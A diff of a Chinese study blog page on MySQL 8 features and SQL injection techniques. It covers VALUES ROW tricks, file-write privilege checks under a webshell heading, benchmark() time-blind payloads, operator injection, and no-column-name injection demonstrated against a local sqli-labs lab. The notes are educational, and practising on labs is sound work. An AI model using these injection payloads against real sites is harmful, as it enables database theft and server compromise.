@@ -437,7 +437,7 @@
 <p>describe [表名];  </p>
 </blockquote>
 </li>
-<li><p>向表中插入数据<br>insert into [表名]<br>values(“[第一行要输入的值]”,”[第二行要输入的值]”,”[第。。。要输入的值]”,”[最后一行要输入的值]”);  </p>
+<li><p>向表中插入数据<br>insert into [表名]<br> values(“[第一行要输入的值]”,”[第二行要输入的值]”,”[第。。。要输入的值]”,”[最后一行要输入的值]”);  </p>
 </li>
 <li><p>删除命令  </p>
 <blockquote>
@@ -519,6 +519,88 @@
 <blockquote>
 <p>alter table [表名] drop[约束]; //删除主键约束。<br>例如：alter table mujie drop primary key; //删除mujie这个表中的主键约束。  </p>
 </blockquote>
+</li>
+</ul>
+<h1 id="MYSQL-8-0-19新特性"><a href="#MYSQL-8-0-19新特性" class="headerlink" title="MYSQL:8.0.19新特性"></a>MYSQL:8.0.19新特性</h1><h2 id="MYSQL8安装"><a href="#MYSQL8安装" class="headerlink" title="MYSQL8安装"></a>MYSQL8安装</h2><p>phpstudy集成环境最高到mysql:8.0.12，而mysql:8.0.12并没有新增我们需要的新特性</p>
+<p>安装方法</p>
+<ul>
+<li>windows 系统：官网下载安装包到本地，配置环境变量，初始化</li>
+<li>linux 系统，同样官网安装</li>
+<li>docker ： docker pull mysql:8.0.19</li>
+</ul>
+<p>这里我推荐使用docker 安装mysql:8.0.19</p>
+<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>安装镜像：</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull mysql:<span class="number">8.0</span>.<span class="number">19</span> </span><br></pre></td></tr></table></figure>
+
+<p>docker run 容器:</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="keyword">run</span><span class="bash"> --name=<span class="string">&quot;mysql8&quot;</span> -p 3360:3306 -v /my/data/mysql8/:/var/lib/mysql/ -e MYSQL_ROOT_POSSWORD=root mysql:8.0.19</span></span><br></pre></td></tr></table></figure>
+
+<p>卷挂载路径：</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/mysql/  数据存储目录</span><br><span class="line">/etc/mysql/  mysql配置目录</span><br><span class="line">/var/log/  日志存储目录</span><br></pre></td></tr></table></figure>
+
+<p>卷的具体挂载可自行选择</p>
+<p>启动容器</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start mysql8</span><br></pre></td></tr></table></figure>
+
+<p>进入容器</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it mysql8 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>进入mysql8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>安装完成</p>
+<h2 id="语句新增"><a href="#语句新增" class="headerlink" title="语句新增"></a>语句新增</h2><h3 id="table语句"><a href="#table语句" class="headerlink" title="table语句"></a>table语句</h3><ul>
+<li><p>查询语句</p>
+<p>  <strong>table [表名]；</strong></p>
+<p>  同之前版本的select * from 【表名】; 都可以显示表的全部信息</p>
+<p>  <img src="image-20210528173723745.png" alt="image-20210528173723745"></p>
+<p>  支持语法：</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TABLE</span> table_name [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name] [LIMIT number [<span class="keyword">OFFSET</span> number]]</span><br><span class="line">#该语句支持使用<span class="keyword">order</span> <span class="keyword">by</span> 和limit 语句进行查询</span><br></pre></td></tr></table></figure>
+
+<p>  order by </p>
+<p>  <img src="image-20210528174058762.png" alt="image-20210528174058762"></p>
+<p>  limit 1,2</p>
+<p>  <img src="image-20210528174152993.png" alt="image-20210528174152993"></p>
+</li>
+</ul>
+<h3 id="values语句"><a href="#values语句" class="headerlink" title="values语句"></a>values语句</h3><ul>
+<li><p>官方语法：</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">VALUES</span> row_constructor_list [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_designator] [LIMIT <span class="keyword">BY</span> number]row_constructor_list:<span class="type">ROW</span>(value_list)[, <span class="type">ROW</span>(value_list)][, ...]value_list:<span class="keyword">value</span>[, <span class="keyword">value</span>][, ...]column_designator:column_index</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>解析：</p>
+<ul>
+<li><p>values row()语句：</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+
+<p>  构造一个虚拟表，值为1，2，3 row译为行</p>
+<p>  这个语句可以构造多行数据</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="type">row</span>(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>),<span class="type">row</span>(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="image-20210528192350589.png" alt="image-20210528192350589"></p>
+<p>  vlaues row()语句可接入多种语句中执行</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">values</span> <span class="type">row</span>(&quot;a&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mujie; </span><br></pre></td></tr></table></figure>
+
+<p>  <img src="image-20210528192733112.png" alt="image-20210528192733112"></p>
+<p>  或者：</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">values</span> <span class="type">row</span>(&quot;a&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mujie <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">^</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">3</span> <span class="keyword">union</span>  <span class="keyword">values</span> <span class="type">row</span>(&quot;a&quot;))a;</span><br></pre></td></tr></table></figure>
+
+<p>  总的来说 values row() 语句就是提供了类似select 1,2,3 的功能，当使用values语句可以一次定义更多的虚拟数据</p>
+<p>  除了构建虚拟表，values row()语句还可以快速创建真实的表</p>
+<p>  values row()语句定义列名，需配合select 使用</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)) <span class="keyword">as</span> xxx(id,username,password);</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="image-20210528194924357.png" alt="image-20210528194924357"></p>
+<p>  配合create table 语句</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)) <span class="keyword">as</span> xxx(id,username,password);</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="image-20210528195303944.png" alt="image-20210528195303944"></p>
+<p>  定义表的类型</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> userss (id <span class="type">int</span>,username <span class="type">char</span>,password <span class="type">char</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)) <span class="keyword">as</span> xxx(id,username,password);</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="image-20210528195846823-1622203128475.png" alt="image-20210528195846823"></p>
+<p>  以上就是mysql8在命令部分的新特性，可用于注入攻击</p>
 </li>
 </ul>
 <h1 id="注入部分"><a href="#注入部分" class="headerlink" title="注入部分"></a>注入部分</h1><h2 id="select-from-命令控制语句"><a href="#select-from-命令控制语句" class="headerlink" title="select * from 命令控制语句"></a>select * from 命令控制语句</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><ul>
@@ -678,11 +760,78 @@
 </blockquote>
 </li>
 </ul>
+<h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><p>sql支持正则匹配</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> regexp <span class="string">&#x27;正则表达式&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>规则：</p>
+<p>  <code>^str</code>表示匹配以str为开头的字符</p>
+<p>  <code>str</code>匹配str</p>
+<p>  <code>str$</code>表示匹配以str为结尾的字符</p>
+</li>
+<li><p>匹配多个字符</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>元字符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td>0个或多个匹配</td>
+</tr>
+<tr>
+<td>+</td>
+<td>1个或多个匹配</td>
+</tr>
+<tr>
+<td>？</td>
+<td>0个或1个匹配</td>
+</tr>
+<tr>
+<td>{n}</td>
+<td>指定数目的匹配</td>
+</tr>
+<tr>
+<td>{n，}</td>
+<td>不少于指定数目的匹配</td>
+</tr>
+<tr>
+<td>{n,m}</td>
+<td>匹配数目的范围（m不超过255）</td>
+</tr>
+</tbody></table>
 <h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><blockquote>
 <p>SQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。  </p>
 </blockquote>
 <p>而造成SQL注入的原因是因为程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码。  </p>
 <h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><ul>
+<li>查看是否有读写权限</li>
+</ul>
+<blockquote>
+<p><code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> file_priv <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span>$<span class="keyword">USER</span>  host<span class="operator">=</span>$HOST;</span><br></pre></td></tr></table></figure>
+
+<p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</p>
+<ul>
+<li>无内容，表示无限制。</li>
+<li>为NULL，表示禁止文件读/写。</li>
+<li>为目录名，表示仅允许对特定目录的文件进行读/写。</li>
+</ul>
+<p>注：<strong>5.5.53本身及之后的版本默认值为NULL，之前的版本无内容</strong>。</p>
+<p>三种方法查看当前<code>secure-file-priv</code>的值：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@secure</span>_file_priv;</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@global</span>.secure_file_priv;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>修改：</p>
+<ul>
+<li>通过修改my.ini文件，添加：<code>secure-file-priv=</code></li>
+<li>启动项添加参数：<code>mysqld.exe --secure-file-priv=</code></li>
+</ul>
+</blockquote>
+<ul>
 <li><p>写入小马——一句话木马  </p>
 <blockquote>
 <p>php木马  </p>
@@ -724,14 +873,375 @@
 <p>sleep 译为：睡觉<br>用于延迟网页响应<br>如：sleep(5) //延迟5秒后响应 或 睡眠5秒  </p>
 </blockquote>
 </li>
-</ul>
-<h4 id="特殊运算"><a href="#特殊运算" class="headerlink" title="特殊运算"></a>特殊运算</h4><ul>
-<li>异或运算<blockquote>
-<p>符号：xor 或 ^<br>a ^ b 当a,b相同时返回0，不同时返回1<br>如id=1’^ (length(“union”)=5)–+<br>当union未被过滤返回0,过滤返回1</p>
+<li><p>benchmark()函数</p>
+<blockquote>
+<p>bench mark 译为基准点</p>
+<p>用于循环执行一条语句</p>
+<p><strong>BENCHMARK（count,expr) 函数重复count次执行表达式expr，它可以用于计时MySQL处理表达式有多快，结果值总是0。</strong></p>
+<p>语法;</p>
+<p>benchmark(执行次数，执行语句)，注入时用发同sleep()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and if(1=1,benchmark(1000000,md5(&#x27;</span>test<span class="string">&#x27;)),0)--+</span></span><br></pre></td></tr></table></figure>
+
+<p>benchmark()函数还可以用在select查询中</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,benchmark(<span class="number">10000000000000000</span>,md5(<span class="string">&#x27;test&#x27;</span>)),<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>当语句正确时benchmark执行，页面显示延时</p>
+<p>这样就巧妙的绕过了if()函数对盲注的影响</p>
+<p>当然运算符注入也可以脱离if</p>
 </blockquote>
 </li>
 </ul>
+<h4 id="运算符注入"><a href="#运算符注入" class="headerlink" title="运算符注入"></a>运算符注入</h4><p>php和mysql中存在多种运算符，这些运算符也可以应用在注入中</p>
+<p>CTF中这种注入方式很常见</p>
+<ul>
+<li><p>异或运算</p>
+<blockquote>
+<p>符号：xor 或 ^<br>a ^ b 当a,b相同时返回0，不同时返回1<br>如</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;^ (length(&quot;union&quot;)=5)--+</span></span><br><span class="line"><span class="string">当union未被过滤返回0,过滤返回1</span></span><br></pre></td></tr></table></figure>
 
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210525155303335.png" alt="image-20210525155303335"></p>
+</li>
+<li><p>等于运算</p>
+<blockquote>
+<p>符号：= 或 like</p>
+<p>a=b时返回1，否则返回0</p>
+<p>如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210525155623553.png" alt="image-20210525155623553"></p>
+<p>注入语句：</p>
+<p><img src="image-20210525155724010.png" alt="image-20210525155724010"></p>
+</blockquote>
+</li>
+<li><p>不等运算</p>
+<blockquote>
+<p>sql有一个特殊的不等运算符：&lt;&gt;</p>
+<p>用法同!=</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="operator">=</span>(<span class="number">1</span><span class="operator">&lt;&gt;</span><span class="number">0</span>)<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210525155923856.png" alt="image-20210525155923856"></p>
+</blockquote>
+</li>
+<li><p>非运算</p>
+<blockquote>
+<p>sql允许！（非运算符）的存在</p>
+<p>通过！假或！真，我们就可以灵活的注入各种情况</p>
+<p><img src="image-20210525160654754.png" alt="image-20210525160654754"></p>
+<p>或者：</p>
+<p><img src="image-20210525160823944.png" alt="image-20210525160823944"></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><blockquote>
+<p>有些时候，我们无法得列名，这种情况包括但不限于过滤了information_schema库</p>
+</blockquote>
+<h3 id="表名的多种查询方式"><a href="#表名的多种查询方式" class="headerlink" title="表名的多种查询方式"></a>表名的多种查询方式</h3><ul>
+<li>系统库概念</li>
+</ul>
+<blockquote>
+<p>mysql系统自带的库一共有四个分别为information_schema,mysql,perfromance_schema,sys</p>
+</blockquote>
+<ul>
+<li>information_schema库</li>
+</ul>
+<blockquote>
+<p>information_schema是一个信息数据库，记录了其他所有数据库的信息</p>
+<p>这是查询表名，列名最常用的库</p>
+</blockquote>
+<ul>
+<li>mysql库</li>
+</ul>
+<blockquote>
+<p>mysql库是mysql的核心数据库，负责储存数据库的用户，权限设置，root密码就储存在这里</p>
+<p>这个数据库同样储存了表名</p>
+<p>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p>
+</blockquote>
+<blockquote>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="operator">||</span> mysql.inndb_index_starts</span><br></pre></td></tr></table></figure>
+</blockquote>
+<ul>
+<li>performance_schema库</li>
+</ul>
+<blockquote>
+<p>performance_schema 主要用于手机服务器性能参数</p>
+</blockquote>
+<ul>
+<li>sys 库</li>
+</ul>
+<blockquote>
+<p>Sys库所有的基础数据来自information_schema和performance_chema。目标是把performance_schema的把复杂度降低，其本身不储存数据</p>
+<p>让DBA能更好的阅读这个库里的内容。让DBA更快的了解DB的运行情况。</p>
+<p>可以通过其中的schema_auto_increment_columns 表来获取表名。</p>
+</blockquote>
+<h3 id="无列名原理"><a href="#无列名原理" class="headerlink" title="无列名原理"></a>无列名原理</h3><ul>
+<li>原理</li>
+</ul>
+<blockquote>
+<p>原理和给列别名类似，类似于在取别名的同时查询数据</p>
+<p>当然我认为有联合查询的影子</p>
+</blockquote>
+<ul>
+<li><p>payload举例：</p>
+<p>  当select 1,2,3;时，数据库会自动建立一个列名和数据都为123的虚拟库</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="image-20210524111601355.png" alt="image-20210524111601355"></p>
+<p>  联合查询基于这个原理，是将123写入列名下查看回显和数据</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="image-20210524111818234.png" alt="image-20210524111818234"></p>
+<p>  无列名原理恰好与此相反，是将数据写入虚拟的1,2,3,列下</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><img src="image-20210524111959779.png" alt="image-20210524111959779"></p>
+<p>这样做，我们便从不知到列名，变成了自定义一个列名，查询这个虚拟表，就得到了数据</p>
+<h3 id="起别名查询"><a href="#起别名查询" class="headerlink" title="起别名查询"></a>起别名查询</h3><p>知道原理，我们可以明白，无列名注入的基本语句如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users); </span><br><span class="line">#括号中的语句表示创建的虚拟表</span><br></pre></td></tr></table></figure>
+
+<p>理论上这样没有错误，但括号里得到的是一个虚拟表，没有表名，会发生报错，所以我们需要给它起个表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a; <span class="operator">||</span> <span class="keyword">as</span> a</span><br><span class="line">#直接跟a或者<span class="keyword">as</span> a都是起别名的方式，这里a是我们给虚拟表别名</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210524113358646.png" alt="image-20210524113358646"></p>
+<p><strong>注意：3使用反引号包括，因为在虚拟表中，列名都是1，2，3，所以我们在查询语句中不能直接用 3 。</strong></p>
+<p>有时反引号被过滤，所有可以用另一种方式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> A <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;A&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210524113744160.png" alt="image-20210524113744160"></p>
+<p>或者给要查询的列也起别名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> c <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> a,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> c <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210524114004881.png" alt="image-20210524114004881"></p>
+<h3 id="注入示例"><a href="#注入示例" class="headerlink" title="注入示例"></a>注入示例</h3><blockquote>
+<p>这里以sql-labs-1为例</p>
+</blockquote>
+<ul>
+<li>payload</li>
+</ul>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sql-labs/Less-1/?id=0&#x27; union select 1,2,group_concat(`3`) from (select 1,2 ,3 union select * from security.users)n--+</span></span><br><span class="line"><span class="comment">#联合注入之无列名注入</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>无列名只是把查询真实表改为了查询虚拟表，其他部分差别不大</p>
+<h3 id="无列名时使用join得到字段名"><a href="#无列名时使用join得到字段名" class="headerlink" title="无列名时使用join得到字段名"></a>无列名时使用join得到字段名</h3><ul>
+<li><p>原理</p>
+<p>  join 用于连接两个表，将两个表的数据同时显示</p>
+<p>  <img src="image-20210524194300573.png" alt="image-20210524194300573"></p>
+<p>  上图是将两表简单相合，是一个无名称的虚拟表</p>
+<p>  当两表中列名存在重复时给虚拟表起别名，便会报错</p>
+<p>  如下</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> emails b)<span class="keyword">as</span> a;</span><br></pre></td></tr></table></figure>
+
+<p>  先分别查出users和emails的数据，并连接为一个虚拟表，起别名为a，然后查询虚拟表a，这时a表会出现名称重复的字段，数据库报错</p>
+<p>  <img src="image-20210524200514332.png" alt="image-20210524200514332"></p>
+<p>  原理同下</p>
+<p>  <img src="image-20210524200634790.png" alt="image-20210524200634790"></p>
+<p>  通过这个原理，我们就可以在系统库被过滤的情况中完成对列名的注入</p>
+</li>
+</ul>
+<h4 id="无列名payload示例"><a href="#无列名payload示例" class="headerlink" title="无列名payload示例"></a>无列名payload示例</h4><blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#完整<span class="keyword">sql</span>语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">join</span> users b <span class="keyword">using</span>(id))n;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210524201435423.png" alt="image-20210524201435423"></p>
+</blockquote>
+<ul>
+<li><p>详解</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>  这是系统本身的查询语句</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from (语句体)n;</span></span><br></pre></td></tr></table></figure>
+
+<p>  这里构造了一个典型的联合查询，n为表名，语句体是无列名注入的语句</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from (select users join users b)n;</span></span><br></pre></td></tr></table></figure>
+
+<p>  括号中语句构造了一个虚拟表，因为是由两个users表使用join语句连接而成，所以必然出现列名重复报错，别名为n便于查询</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from (select * from users join users a)n;</span></span><br></pre></td></tr></table></figure>
+
+<p>  join查询的两个表不能重名，所以要将一个表起别名</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from (select * from users join users a using(id))n;</span></span><br></pre></td></tr></table></figure>
+
+<p>  using()方法用于join中，规定join两个表连接时字段名相同的列</p>
+<p>  使用using()后，列名不会重复</p>
+<p>  <img src="image-20210525151501090.png" alt="image-20210525151501090"></p>
+<p>  同一张表也遵循这个原理</p>
+<p>  <img src="image-20210525151557761.png" alt="image-20210525151557761"></p>
+<p>  using()目的：</p>
+<p>  <strong>列名重复报错只会报错第一列，而不会全部报错</strong></p>
+<p>  <strong>using()方法可以解决这个问题</strong></p>
+</li>
+<li><p>注入完整语句</p>
